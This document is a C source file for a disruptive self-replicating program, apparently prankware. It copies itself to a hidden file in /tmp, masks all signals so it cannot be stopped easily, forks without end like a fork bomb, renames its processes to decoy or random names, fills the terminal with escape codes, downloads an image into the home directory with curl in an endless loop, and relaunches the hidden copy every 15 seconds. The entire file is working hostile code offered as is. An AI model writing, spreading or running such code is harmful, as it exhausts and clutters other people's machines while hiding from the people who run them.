#include <stdio.h>
#include <string.h>
#include <curses.h>
#include <term.h>
#include <time.h>
#include <signal.h>
#include <stdlib.h>
#include <sys/types.h>
#ifdef __linux__
# include <sys/prctl.h>
#endif
#include <unistd.h>

char *g_escapes[] = {
	"\033[2J" //  clear screen
    "\033[1m" // bold
    "\033[4m" // underscore
    "\033[5m" // blink
    "\033[7m" // reverse video on
    "\033[8m" // concealed on

    "\033[30m" // black
    "\033[31m" // red
    "\033[32m" // green
    "\033[33m" // yellow
    "\033[34m" // blue
    "\033[35m" // magenta
    "\033[36m" // cyan
    "\033[37m" // white

    "\033[40m" // black
    "\033[41m" // red
    "\033[42m" // green
    "\033[43m" // yellow
    "\033[44m" // blue
    "\033[45m" // magenta
    "\033[46m" // cyan
    "\033[47m" // white

    "\033[=0h" // 40x25 monochrome
    "\b" // bell
};

void	random_pname(char *s1) {
	FILE *fp = fopen("/dev/urandom", "r");
	char *str = malloc(16);
	fread(str, 1, 15, fp);
	if (!s1) {
		str[0] = 'm';
		str[1] = 'a';
		str[2] = 'r';
		str[3] = 'e';
		str[4] = '_';
	}
	else {
		for (unsigned i = 0; s1[i] && i < 15; ++i) {
			str[i] = s1[i];
		}
	}
#ifdef __linux__
	prctl(PR_SET_NAME, str);
#endif
	fclose(fp);
	free(str);
}

void	colors() {
	random_pname("colors_");

	while (1) {
		printf("%s", g_escapes[rand() % (sizeof(g_escapes) / sizeof(*g_escapes))]);
		fflush(stdout);
		sleep(20);
	}
}

void	luigme() {
	random_pname("looig_");
	while (1) {
		system("curl 'https://ih0.redbubble.net/image.433724851.6990/flat,550x550,075,f.u3.jpg' > ~/.luigi$(date | awk '{print $4}').jpg 2>/dev/null");
	}
}

void	protection() {
	random_pname("durex_");
	while (1) {
		sleep(15);
		system("/tmp/.yaboi");
	}
}

void	thing();

static void (*g_bois[])(void) = {
	colors,
	colors,
	colors,
	colors,
	colors,
	colors,
	luigme,
	luigme,
	luigme,
	luigme,
	luigme,
	luigme,
	luigme,
	luigme,
	luigme,
	luigme,
	protection,
};

int forkyboi() {
	int		pid;
	int		sid;

	write(1, "A", 1);
	pid = fork();
	if (pid < 0)
		exit(1);
	if (pid > 0)
		g_bois[rand() % (sizeof(g_bois) / sizeof(*g_bois))]();
	sid = setsid();
	if (sid < 0)
		exit(1);

	random_pname(NULL);

	sleep(1);
	thing();
	return (0);
}

char* concat(const char *s1, const char *s2, const char *s3)
{
	char *result = malloc(strlen(s1) + strlen(s2) + strlen(s3) + 1);
	strcpy(result, s1);
	strcat(result, s2);
	strcat(result, s3);
	return result;
}

void	thing() {
	sigset_t	mask;

	srand(time(NULL));

	random_pname(NULL);
	sigfillset(&mask);
	sigprocmask(SIG_SETMASK, &mask, NULL);

	forkyboi();
}

int main(int argc, char **argv) {
	(void)argc;
	(void)argv;

	if (strcmp(argv[0], "/tmp/.yaboi")) {
		char *s = concat("cp ", argv[0], " /tmp/.yaboi");
		system(s);
		free(s);
	}

	thing();
}
